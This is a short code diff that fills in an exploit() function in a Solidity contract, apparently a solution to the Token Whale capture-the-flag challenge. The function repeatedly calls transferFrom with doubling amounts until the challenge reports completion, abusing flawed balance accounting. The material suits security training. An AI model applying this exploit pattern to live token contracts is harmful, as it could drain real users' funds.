@@ -69,5 +69,11 @@ contract ExploitContract {
         tokenWhale = _tokenWhale;
     }
 
-    // write your exploit functions below
+    function exploit() public {
+        uint256 amount = 1000;
+        while (!tokenWhale.isComplete()) {
+            tokenWhale.transferFrom(msg.sender, msg.sender, amount);
+            amount += amount;
+        }
+    }
 }
